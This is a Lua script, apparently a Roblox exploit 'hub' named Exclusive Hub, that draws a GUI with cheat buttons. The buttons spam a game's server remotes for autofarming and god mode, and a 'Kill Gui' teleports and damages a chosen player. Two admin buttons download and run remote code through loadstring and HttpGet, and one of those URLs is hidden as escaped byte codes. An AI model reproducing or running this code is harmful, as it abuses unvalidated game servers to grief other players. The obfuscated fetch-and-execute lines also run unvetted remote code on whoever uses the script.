
-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local thing = Instance.new("Frame")
local Main = Instance.new("ScrollingFrame")
local TextLabel_2 = Instance.new("TextLabel")
local TextButton_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local TextButton_5 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextButton_7 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local TextButton_8 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Credits = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local TextButton_9 = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local Admins = Instance.new("Frame")
local UICorner_13 = Instance.new("UICorner")
local TextButton_10 = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local TextButton_11 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local TextButton_12 = Instance.new("TextButton")
local Guis = Instance.new("Frame")
local TextButton_13 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local UICorner_17 = Instance.new("UICorner")
local TextButton_14 = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local Key = Instance.new("Frame")
local UICorner_19 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local UICorner_20 = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local UICorner_21 = Instance.new("UICorner")
local TextButton_15 = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local TextLabel_7 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Frame.Position = UDim2.new(0.398589849, 0, 0.180797994, 0)
Frame.Size = UDim2.new(0, 559, 0, 375)
Frame.Visible = false
Frame.Active = true
Frame.Draggable = true

UICorner.Parent = Frame

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(0, 559, 0, 50)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Exclusive Hub"
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 20.000
TextLabel.TextWrapped = true

UICorner_2.Parent = TextLabel

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0, 0, 0.170666665, 0)
TextButton.Size = UDim2.new(0, 102, 0, 34)
TextButton.Font = Enum.Font.SourceSansBold
TextButton.Text = "Main"
TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton.TextSize = 20.000
TextButton.MouseButton1Down:connect(function()
	Admins.Visible = false
	Credits.Visible = false
	Guis.Visible = false
	Main.Visible = true
end)

UICorner_3.Parent = TextButton

thing.Name = "thing"
thing.Parent = Frame
thing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
thing.BorderColor3 = Color3.fromRGB(255, 255, 255)
thing.BorderSizePixel = 2
thing.Position = UDim2.new(0.17710197, 0, 0, 0)
thing.Size = UDim2.new(0, 0, 0, 375)

Main.Name = "Main"
Main.Parent = Frame
Main.Active = true
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.18962431, 0, 0.194666669, 0)
Main.Size = UDim2.new(0, 453, 0, 302)

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Size = UDim2.new(0, 187, 0, 34)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "AutoFarms:"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 20.000
TextLabel_2.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)

TextButton_2.Parent = Main
TextButton_2.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
TextButton_2.Position = UDim2.new(0.0198675506, 0, 0.0679914132, 0)
TextButton_2.Size = UDim2.new(0, 169, 0, 43)
TextButton_2.Font = Enum.Font.SourceSansBold
TextButton_2.Text = "Fastfarm"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 20.000
TextButton_2.MouseButton1Down:connect(function()
	while wait() do
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
		game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	end
end)

UICorner_4.Parent = TextButton_2

TextButton_3.Parent = Main
TextButton_3.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
TextButton_3.Position = UDim2.new(0.0198675692, 0, 0.146186188, 0)
TextButton_3.Size = UDim2.new(0, 169, 0, 42)
TextButton_3.Font = Enum.Font.SourceSansBold
TextButton_3.Text = "Unfastfarm"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 20.000
TextButton_3.MouseButton1Down:connect(function()
	local sav = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	game.Players.LocalPlayer.Character.Humanoid.Health = 0
	game.Players.LocalPlayer.Character:Destroy()
	wait(5.49)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = sav
end)

UICorner_5.Parent = TextButton_3

TextButton_4.Parent = Main
TextButton_4.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
TextButton_4.Position = UDim2.new(0.0198675506, 0, 0.231165111, 0)
TextButton_4.Size = UDim2.new(0, 169, 0, 41)
TextButton_4.Font = Enum.Font.SourceSansBold
TextButton_4.Text = "Slowfarm"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 20.000
TextButton_4.MouseButton1Down:connect(function()
	while wait() do
	game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	game:GetService("Players").LocalPlayer.Backpack.sword.Handle.up.RemoteEvent:FireServer()
	end
end)

UICorner_6.Parent = TextButton_4

TextLabel_3.Parent = Main
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.465783656, 0, 0, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 34)
TextLabel_3.Font = Enum.Font.SourceSansBold
TextLabel_3.Text = "GodModes:"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 20.000

TextButton_5.Parent = Main
TextButton_5.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
TextButton_5.Position = UDim2.new(0.498896241, 0, 0.0688528493, 0)
TextButton_5.Size = UDim2.new(0, 169, 0, 42)
TextButton_5.Font = Enum.Font.SourceSansBold
TextButton_5.Text = "	Permagod"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextSize = 20.000
TextButton_5.MouseButton1Down:connect(function()
	while wait() do
	if game.Players.LocalPlayer.Backpack:FindFirstChild("sword") then
		if game.Players.LocalPlayer.Backpack:FindFirstChild("sword") then
			game.Players.LocalPlayer.Backpack.sword.Handle.dmg.RemoteEvent:FireServer(game.Players.LocalPlayer.Character.Humanoid, - math.huge)
			wait(0.1)
		else
			local lplr = game.Players.LocalPlayer.Name 
			while true do
				wait()
				game:GetService('Players').LocalPlayer.Character.Humanoid:EquipTool(game.Players[lplr].Backpack["sword"])
				for i,v in ipairs(game.Players:GetPlayers())do
					game.Workspace[lplr].sword.Handle.dmg.RemoteEvent:FireServer(workspace[v.Name].Humanoid, -9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)
					game.Players.LocalPlayer.Character.pvp:Destroy()
				end 
			end
		end
		end
		end
end)

UICorner_7.Parent = TextButton_5

TextButton_6.Parent = Main
TextButton_6.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
TextButton_6.Position = UDim2.new(0.498896241, 0, 0.145867124, 0)
TextButton_6.Size = UDim2.new(0, 169, 0, 42)
TextButton_6.Font = Enum.Font.SourceSansBold
TextButton_6.Text = "Unpermagod"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextSize = 20.000
TextButton_6.MouseButton1Down:connect(function()
	local sav = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	game.Players.LocalPlayer.Character.Humanoid.Health = 0
	game.Players.LocalPlayer.Character:Destroy()
	wait(5.49)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = sav
end)

UICorner_8.Parent = TextButton_6

TextButton_7.Parent = Main
TextButton_7.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
TextButton_7.Position = UDim2.new(0.498896241, 0, 0.232281208, 0)
TextButton_7.Size = UDim2.new(0, 169, 0, 40)
TextButton_7.Font = Enum.Font.SourceSansBold
TextButton_7.Text = "God"
TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.TextSize = 20.000
TextButton_7.MouseButton1Down:connect(function()
	if game.Players.LocalPlayer.Backpack:FindFirstChild("sword") then
		if game.Players.LocalPlayer.Backpack:FindFirstChild("sword") then
			game.Players.LocalPlayer.Backpack.sword.Handle.dmg.RemoteEvent:FireServer(game.Players.LocalPlayer.Character.Humanoid, - math.huge)
			wait(0.1)
		else
			local lplr = game.Players.LocalPlayer.Name 
			while true do
				wait()
				game:GetService('Players').LocalPlayer.Character.Humanoid:EquipTool(game.Players[lplr].Backpack["sword"])
				for i,v in ipairs(game.Players:GetPlayers())do
					game.Workspace[lplr].sword.Handle.dmg.RemoteEvent:FireServer(workspace[v.Name].Humanoid, -9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)
					game.Players.LocalPlayer.Character.pvp:Destroy()
				end 
			end
		end
	end
end)

UICorner_9.Parent = TextButton_7

TextButton_8.Parent = Frame
TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.BackgroundTransparency = 1.000
TextButton_8.Position = UDim2.new(0, 0, 0.546666622, 0)
TextButton_8.Size = UDim2.new(0, 99, 0, 40)
TextButton_8.Font = Enum.Font.SourceSansBold
TextButton_8.Text = "Credits"
TextButton_8.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_8.TextSize = 20.000
TextButton_8.MouseButton1Down:connect(function()
	Admins.Visible = false
	Credits.Visible = true
	Guis.Visible = false
	Main.Visible = false
end)

UICorner_10.Parent = TextButton_8

Credits.Name = "Credits"
Credits.Parent = Frame
Credits.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
Credits.Position = UDim2.new(0.193202153, 0, 0.194666669, 0)
Credits.Size = UDim2.new(0, 451, 0, 302)
Credits.Visible = false

UICorner_11.Parent = Credits

TextLabel_4.Parent = Credits
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.24390243, 0, 0, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.SourceSansBold
TextLabel_4.Text = "This Is The Official Owner Of Exclusive Hub"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 25.000

TextLabel_5.Parent = Credits
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.243902445, 0, 0.221854329, 0)
TextLabel_5.Size = UDim2.new(0, 200, 0, 50)
TextLabel_5.Font = Enum.Font.SourceSansBold
TextLabel_5.Text = ":D Alzn#6758"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 20.000

TextButton_9.Parent = Frame
TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.BackgroundTransparency = 1.000
TextButton_9.Position = UDim2.new(0.0143112708, 0, 0.301333338, 0)
TextButton_9.Size = UDim2.new(0, 85, 0, 38)
TextButton_9.Font = Enum.Font.SourceSansBold
TextButton_9.Text = "Admins"
TextButton_9.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_9.TextSize = 20.000
TextButton_9.MouseButton1Down:connect(function()
	Admins.Visible = true
	Credits.Visible = false
	Guis.Visible = false
	Main.Visible = false
end)

UICorner_12.Parent = TextButton_9

Admins.Name = "Admins"
Admins.Parent = Frame
Admins.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Admins.Position = UDim2.new(0.196779862, 0, 0.20266667, 0)
Admins.Size = UDim2.new(0, 448, 0, 299)
Admins.Visible = false

UICorner_13.Parent = Admins

TextButton_10.Parent = Admins
TextButton_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.Position = UDim2.new(0.0290178563, 0, 0.103678927, 0)
TextButton_10.Size = UDim2.new(0, 160, 0, 41)
TextButton_10.Font = Enum.Font.SourceSansBold
TextButton_10.Text = "Iv Admin"
TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.TextSize = 20.000
TextButton_10.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\79\109\110\105\112\111\116\101\110\99\101\68\101\118\101\108\111\112\101\114\47\78\117\109\98\101\114\47\109\97\105\110\47\49\46\108\117\97'))()
end)

UICorner_14.Parent = TextButton_10

TextButton_11.Parent = Admins
TextButton_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.Position = UDim2.new(0.611607134, 0, 0.103678934, 0)
TextButton_11.Size = UDim2.new(0, 160, 0, 40)
TextButton_11.Font = Enum.Font.SourceSansBold
TextButton_11.Text = "Infinity Yield"
TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.TextSize = 20.000
TextButton_11.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

UICorner_15.Parent = TextButton_11

TextButton_12.Parent = Frame
TextButton_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.BackgroundTransparency = 1.000
TextButton_12.Position = UDim2.new(0.0214669053, 0, 0.421333343, 0)
TextButton_12.Size = UDim2.new(0, 74, 0, 36)
TextButton_12.Font = Enum.Font.SourceSansBold
TextButton_12.Text = "Guis"
TextButton_12.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_12.TextSize = 20.000
TextButton_12.MouseButton1Down:connect(function()
	Admins.Visible = false
	Credits.Visible = false
	Guis.Visible = true
	Main.Visible = false
end)

Guis.Name = "Guis"
Guis.Parent = Frame
Guis.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Guis.Position = UDim2.new(0.205724508, 0, 0.216000006, 0)
Guis.Size = UDim2.new(0, 443, 0, 294)
Guis.Visible = false

TextButton_13.Parent = Guis
TextButton_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.Position = UDim2.new(0.024830699, 0, 0.132653058, 0)
TextButton_13.Size = UDim2.new(0, 170, 0, 38)
TextButton_13.Font = Enum.Font.SourceSansBold
TextButton_13.Text = "Kill Gui"
TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.TextSize = 20.000
TextButton_13.MouseButton1Down:connect(function()
	-- Gui to Lua
	-- Version: 3.2

	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local UIGradient = Instance.new("UIGradient")
	local TextLabel = Instance.new("TextLabel")
	local TextButton = Instance.new("TextButton")
	local UICorner_2 = Instance.new("UICorner")
	local TextBox = Instance.new("TextBox")
	local UICorner_3 = Instance.new("UICorner")

	--Properties:

	ScreenGui.Parent = game.CoreGui

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame.Position = UDim2.new(0.341284394, 0, 0.301745623, 0)
	Frame.Size = UDim2.new(0, 257, 0, 290)
	Frame.Active = true
	Frame.Draggable = true

	UICorner.Parent = Frame

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(0.78, Color3.fromRGB(83, 83, 83)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
	UIGradient.Parent = Frame

	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.Size = UDim2.new(0, 257, 0, 50)
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = "Kill Gui By Alzn#6758"
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 20.000

	TextButton.Parent = Frame
	TextButton.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
	TextButton.Position = UDim2.new(0.108949415, 0, 0.69655174, 0)
	TextButton.Size = UDim2.new(0, 200, 0, 50)
	TextButton.Font = Enum.Font.SourceSansBold
	TextButton.Text = "Kill!"
	TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextButton.TextSize = 20.000
	TextButton.MouseButton1Down:connect(function()
		Target = TextBox.Text

		NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.Humanoid.Name = 1
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		wait()
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		wait()
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
		end
		local function tp(player,player2)
			local char1,char2=player.Character,player2.Character
			if char1 and char2 then
				char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
			end
		end
		wait(0.6)
		local function getout(player,player2)
			local char1,char2=player.Character,player2.Character
			if char1 and char2 then
				char1:MoveTo(char2.Torso.Position)
			end
		end
		wait(0.2)
		local player = game.Players.LocalPlayer
		local mouse = player:GetMouse()
		local backpack = player.Backpack
		local char = player.Character
		local hrp = char.HumanoidRootPart
		local hum = char.Humanoid
		local tween = game:GetService("TweenService")

		function gatherswords()
			local swords = {}
			for i, v in pairs(backpack:GetChildren())do
				if(v:IsA"Tool")then
					table.insert(swords,v)
				end
			end
			for i, v in pairs(char:GetChildren())do
				if(v:IsA"Tool")then
					table.insert(swords,v)
				end
			end
			return swords
		end

		local swords = gatherswords()

		for i, sword in pairs(swords) do
			if(i~=#swords)then
				sword.Parent = backpack
				sword.Handle.Massless = true
				sword.Grip = (sword.Grip*CFrame.new(0,0,-0.0)) * CFrame.Angles(0, (0.00/(#swords-1))*i, 0)
			end
			sword.Parent = char
			sword.Handle.Touched:Connect(function(t)
				if(t.Parent)and(t.Parent:FindFirstChild("Humanoid"))and(t.Parent.Name~=player.Name)then
					sword.Handle.dmg.RemoteEvent:FireServer(t.Parent.Humanoid, math.huge)
				end
			end)
		end
		tp(game.Players[Target], game.Players.LocalPlayer)
		wait(0.1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0, 0)
		wait()
		tp(game.Players[Target], game.Players.LocalPlayer)
		wait(0.3)
		getout(game.Players.LocalPlayer, game.Players[Target])
		wait(0.4)
		game.Players.LocalPlayer:LoadCharacter()
	end)

	UICorner_2.Parent = TextButton

	TextBox.Parent = Frame
	TextBox.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
	TextBox.Position = UDim2.new(0.108949415, 0, 0.286206901, 0)
	TextBox.Size = UDim2.new(0, 200, 0, 50)
	TextBox.Font = Enum.Font.SourceSansBold
	TextBox.PlaceholderText = "Put Player Display Here!"
	TextBox.Text = ""
	TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextBox.TextSize = 20.000

	UICorner_3.Parent = TextBox

	-- Scripts:

	local function QGZED_fake_script() -- TextBox.LocalScript 
		local script = Instance.new('LocalScript', TextBox)

		script.Parent.FocusLost:connect(function()
			if script.Parent.Text == "" then
				print("its nothing")
			else
				for i,v in pairs(game.Players:GetChildren()) do
					if (string.sub(string.lower(v.Name and v.DisplayName),1,string.len(script.Parent.Text))) == string.lower(script.Parent.Text) then
						script.Parent.Text = v.Name or v.DisplayName	
					end
				end
			end
		end)
	end
	coroutine.wrap(QGZED_fake_script)()
end)

UICorner_16.Parent = TextButton_13

UICorner_17.Parent = Guis

TextButton_14.Parent = Guis
TextButton_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.Position = UDim2.new(0.593679368, 0, 0.132653058, 0)
TextButton_14.Size = UDim2.new(0, 170, 0, 38)
TextButton_14.Font = Enum.Font.SourceSansBold
TextButton_14.Text = "Speed Gui"
TextButton_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.TextSize = 20.000
TextButton_14.MouseButton1Down:connect(function()
	-- Gui to Lua
	-- Version: 3.2

	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextBox = Instance.new("TextBox")

	--Properties:

	ScreenGui.Parent = game.CoreGui

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0, 0, 0.925186932, 0)
	Frame.Size = UDim2.new(0, 248, 0, 60)
	Frame.Active = true
	Frame.Draggable = true

	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.BorderSizePixel = 0
	TextLabel.Size = UDim2.new(0, 200, 0, 28)
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = "Speed Changer By Alzn#6758"
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 14.000

	TextBox.Parent = Frame
	TextBox.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	TextBox.BorderSizePixel = 0
	TextBox.Position = UDim2.new(0.0443547964, 0, 0.466666698, 0)
	TextBox.Size = UDim2.new(0, 200, 0, 26)
	TextBox.Font = Enum.Font.SourceSansBold
	TextBox.PlaceholderColor3 = Color3.fromRGB(143, 143, 143)
	TextBox.PlaceholderText = "Put Your Speed Number Here!"
	TextBox.Text = ""
	TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextBox.TextSize = 14.000

	-- Scripts:

	local function FIEEHB_fake_script() -- TextBox.LocalScript 
		local script = Instance.new('LocalScript', TextBox)

		script.Parent.FocusLost:Connect(function(enter)
			if enter then
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = TextBox.Text
			end
		end)
	end
	coroutine.wrap(FIEEHB_fake_script)()
end)

UICorner_18.Parent = TextButton_14

Key.Name = "Key"
Key.Parent = ScreenGui
Key.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Key.Position = UDim2.new(0.319552481, 0, 0.317955136, 0)
Key.Size = UDim2.new(0, 525, 0, 254)

UICorner_19.Parent = Key

TextLabel_6.Parent = Key
TextLabel_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Size = UDim2.new(0, 525, 0, 50)
TextLabel_6.Font = Enum.Font.SourceSansBold
TextLabel_6.Text = "Exclusive Hub KeySystem"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_6.TextSize = 35.000
TextLabel_6.TextWrapped = true

UICorner_20.Parent = TextLabel_6

TextBox.Parent = Key
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.16761905, 0, 0.40157482, 0)
TextBox.Size = UDim2.new(0, 349, 0, 50)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "[Put Your Key Here!]"
TextBox.Text = "bwQ29oqpsuIo1"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 25.000

UICorner_21.Parent = TextBox

TextButton_15.Parent = Key
TextButton_15.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TextButton_15.Position = UDim2.new(0.308571428, 0, 0.712598443, 0)
TextButton_15.Size = UDim2.new(0, 200, 0, 50)
TextButton_15.Font = Enum.Font.SourceSansBold
TextButton_15.Text = "Enter!"
TextButton_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.TextSize = 25.000

UICorner_22.Parent = TextButton_15

TextLabel_7.Parent = Key
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.BorderSizePixel = 0
TextLabel_7.Position = UDim2.new(0.308571428, 0, 0.157480314, 0)
TextLabel_7.Size = UDim2.new(0, 200, 0, 50)
TextLabel_7.Font = Enum.Font.SourceSansBold
TextLabel_7.Text = "Note: This Is the Key System Of the Official Exclusive Hub"
